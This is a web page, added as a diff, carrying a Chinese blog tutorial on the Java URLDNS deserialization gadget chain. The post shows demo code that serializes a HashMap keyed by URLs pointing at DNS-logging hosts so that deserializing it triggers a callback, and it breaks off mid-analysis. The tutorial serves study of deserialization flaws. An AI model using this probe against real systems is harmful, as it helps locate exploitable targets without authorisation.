@@ -1,0 +1,319 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>java安全漫谈-反序列化-2 | X1ly?S</title><meta name="author" content="X1ly?S"><meta name="copyright" content="X1ly?S"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ysoserial根据不同的利用链生成命令可控的序列化数据 HashMap调用put触发DNS请求分析首先我们编写一个hashmap 12345678910111213package org.javasec.gadget;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java安全漫谈-反序列化-2">
+<meta property="og:url" content="https://x1lys.github.io/2025/12/01/7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2/index.html">
+<meta property="og:site_name" content="X1ly?S">
+<meta property="og:description" content="ysoserial根据不同的利用链生成命令可控的序列化数据 HashMap调用put触发DNS请求分析首先我们编写一个hashmap 12345678910111213package org.javasec.gadget;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://x1lys.github.io/img/1.jpg">
+<meta property="article:published_time" content="2025-12-01T14:32:59.000Z">
+<meta property="article:modified_time" content="2025-12-01T14:44:02.371Z">
+<meta property="article:author" content="X1ly?S">
+<meta property="article:tag" content="java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://x1lys.github.io/img/1.jpg"><link rel="shortcut icon" href="/img/999.png"><link rel="canonical" href="https://x1lys.github.io/2025/12/01/7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":300,"languages":{"author":"作者: X1ly?S","link":"链接: ","source":"来源: X1ly?S","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'java安全漫谈-反序列化-2',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/30.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/11.jpg" onerror="onerror=null;src='/img/47.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">109</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">20</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-cogs"></i><span> 技术</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-list-alt"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa-solid fa-heart"></i><span> 爱好</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E5%85%AD%E7%88%BB/"><i class="fa-fw fa-solid fa-bars"></i><span> 六爻</span></a></li><li><a class="site-page child" href="/categories/%E5%86%99%E4%BD%9C/"><i class="fa-fw fas fa-pencil-alt"></i><span> 写作</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-film"></i><span> 电影</span></a></li><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-solid fa-users"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/msg/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/1.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1ly?S</span></a><a class="nav-page-title" href="/"><span class="site-name">java安全漫谈-反序列化-2</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-cogs"></i><span> 技术</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-list-alt"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa-solid fa-heart"></i><span> 爱好</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E5%85%AD%E7%88%BB/"><i class="fa-fw fa-solid fa-bars"></i><span> 六爻</span></a></li><li><a class="site-page child" href="/categories/%E5%86%99%E4%BD%9C/"><i class="fa-fw fas fa-pencil-alt"></i><span> 写作</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-film"></i><span> 电影</span></a></li><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-solid fa-users"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/msg/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">java安全漫谈-反序列化-2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-01T14:32:59.000Z" title="发表于 2025-12-01 22:32:59">2025-12-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-01T14:44:02.371Z" title="更新于 2025-12-01 22:44:02">2025-12-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">213</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>1分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2025/12/01/7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2/#post-comment"><span class="waline-comment-count" data-path="/2025/12/01/7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2/"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2025-12-01 22:44:02&quot;}" hidden></div><h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><p>根据不同的利用链生成命令可控的序列化数据</p>
+<h2 id="HashMap调用put触发DNS请求分析"><a href="#HashMap调用put触发DNS请求分析" class="headerlink" title="HashMap调用put触发DNS请求分析"></a>HashMap调用put触发DNS请求分析</h2><p>首先我们编写一个hashmap</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.javasec.gadget;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span> <span class="keyword">throws</span> MalformedURLException &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://1111.kngfrhti.requestrepo.com&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(url1, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>仅仅只是做一个put url1对象的操作，运行后，发现直接就发起了DNS请求</p>
+<p><img src="https://s2.loli.net/2025/12/01/CKb41PXJVIE9LSj.png" alt="image-20251117161059509"></p>
+<p>我们跟进一下为什么</p>
+<p>跟进HashMap.put，第一个参数传入Java.net.URL对象url1</p>
+<p><img src="https://s2.loli.net/2025/12/01/Y3bBzQU5OpjE6gq.png" alt="image-20251117162600663"></p>
+<p>put方法接收第一个参数key，即Java.net.URL对象，把他传入hash(key)</p>
+<p><img src="https://s2.loli.net/2025/12/01/Nbwnxd9r3A8Vpy5.png" alt="image-20251117162631678"></p>
+<p>跟进hash，key不为null则调用key.hashCode()</p>
+<p><img src="https://s2.loli.net/2025/12/01/nvMNKZQsCJ6YcSb.png" alt="image-20251117162830807"></p>
+<p>key是Java.net.URL对象，于是跟进Java.net.URL.hashCode</p>
+<p><img src="https://s2.loli.net/2025/12/01/lxTB5MsuaqUdhow.png" alt="image-20251117163515865"></p>
+<p>hashCode不为-1则 hashCode &#x3D; handler.hashCode(this); this是我们的对象url1</p>
+<p>把”<a target="_blank" rel="noopener" href="https://1111.kngfrhti.requestrepo.com"传入handler.hashcode(),继续跟进handler.hashcode/">https://1111.kngfrhti.requestrepo.com&quot;传入handler.hashCode()，继续跟进handler.hashCode</a></p>
+<p><img src="https://s2.loli.net/2025/12/01/JOzKmhvtVpcs1Bw.png" alt="image-20251117164620187"></p>
+<p>跟进，找到了getByName触发dns请求的方法</p>
+<p><img src="https://s2.loli.net/2025/12/01/aOB8rxDJZcHzVej.png" alt="image-20251117164647567"></p>
+<p><img src="https://s2.loli.net/2025/12/01/BE3XFLP159AkCyx.png" alt="image-20251118150455573"></p>
+<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p>既然是反序列化，那么就看HashMap类的readobject，因为反序列化时，触发dns请求的入口方法一定是HashMap类的readobject</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">    <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">    lf = Math.clamp(lf, <span class="number">0.25f</span>, <span class="number">4.0f</span>);</span><br><span class="line">    HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">    reinitialize();</span><br><span class="line"></span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// use defaults</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">dc</span> <span class="operator">=</span> Math.ceil(mappings / (<span class="type">double</span>)lf);</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((dc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (dc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="type">int</span>)dc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到后面这行 putVal(hash(key), key, value, false, false)，调用了hash方法，我们跟进</p>
+<p><img src="https://s2.loli.net/2025/12/01/A4ivDhz6kbCq7eT.png" alt="image-20251118143027422"></p>
+<p>然后调用URL类的hashCode方法</p>
+<p><img src="https://s2.loli.net/2025/12/01/Q3XC7pv4NZg9xcd.png" alt="image-20251118143114292"></p>
+<p>然后是java net.URLStreamHandler.hashCode，跟进，调用java net.URLStreamHandler.getHostAddress</p>
+<p><img src="https://s2.loli.net/2025/12/01/XNMhTwuCvgV6Se3.png" alt="image-20251118143159278"></p>
+<p>再跟进，调用InetAddress.getByName，触发dns请求</p>
+<p><img src="https://s2.loli.net/2025/12/01/QFmGMf82O5nbacg.png" alt="image-20251118143303623"></p>
+<p><img src="https://s2.loli.net/2025/12/01/ORufmqsDQ3Tv7Vc.png" alt="image-20251118150505975"></p>
+<p>于是我们编写demo，验证urldns链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.javasec.gadget;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://URLDNS.25e29b290c.ddns.1433.eu.org&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        System.out.println(<span class="string">&quot;开始Put&quot;</span>);</span><br><span class="line">        map.put(url1, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Put结束&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos= <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;map.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;开始反序列化&quot;</span>);</span><br><span class="line">        unser.test();</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化结束&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先注释反序列化的操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.javasec.gadget;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://FromPut.25e29b290c.ddns.1433.eu.org&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        System.out.println(<span class="string">&quot;开始Put&quot;</span>);</span><br><span class="line">        map.put(url1, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Put结束&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos= <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;map.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println(&quot;开始反序列化&quot;);</span></span><br><span class="line"><span class="comment">//        unser.test();</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;反序列化结束&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行发现</p>
+<p><img src="https://s2.loli.net/2025/12/01/MK1dlhLAopuBrNP.png" alt="image-20251118171443872"></p>
+<p>直接就触发了一次dns请求，但我们上面已经分析了put的调用流程，面对这就不会感到奇怪，因为单独只调用hashmap.put本来就会触发一次dns请求，上面已经分析过</p>
+<p><img src="https://s2.loli.net/2025/12/01/jxYaip3KZk6fPMd.png" alt="image-20251118171506973"></p>
+<p>接下来我们提供反序列化来触发dns请求，取消代码注释</p>
+<p><img src="https://s2.loli.net/2025/12/01/6PbwhNOr8vayedj.png" alt="image-20251118171740100"></p>
+<p>按道理来说，应该出现两个dns请求对吧？一个来自put，第二个才是反序列化触发的</p>
+<p><img src="https://s2.loli.net/2025/12/01/8d6M7n5hc3Bgm2v.png" alt="image-20251118171812702"></p>
+<p>但是很奇怪的是这里只有一次名为test的dns记录，到底是put触发的还是反序列化触发的呢？于是我们调试跟进分析下为什么</p>
+<p>在关键位置下断，断住之后，这里步出后会发起dns请求，此时是put调用触发的</p>
+<p><img src="https://s2.loli.net/2025/12/01/6UhbjT7Pzdvs2Cr.png" alt="image-20251118173113752"></p>
+<p><img src="https://s2.loli.net/2025/12/01/CUX6OM2KZvHfmPa.png" alt="image-20251118172532179"></p>
+<p>h返回171643618</p>
+<p><img src="https://s2.loli.net/2025/12/01/4n8sjMqZzoXhle2.png" alt="image-20251118173211886"></p>
+<p>然后运行到URL.hashCode返回-1后，传入URLStreamHandler</p>
+<p><img src="https://s2.loli.net/2025/12/01/pnI6rFSNkEqCDYQ.png" alt="image-20251118173311128"></p>
+<p>注意看这段逻辑</p>
+<p>进入if判断，如果URL.hashCode不等于-1，则直接返回URL.hashCode</p>
+<p>如果URL.hashCode&#x3D;-1才会进入URLStreamHandler.handler.hashCode，才会触发DNS</p>
+<p>我们添加一些调试信息</p>
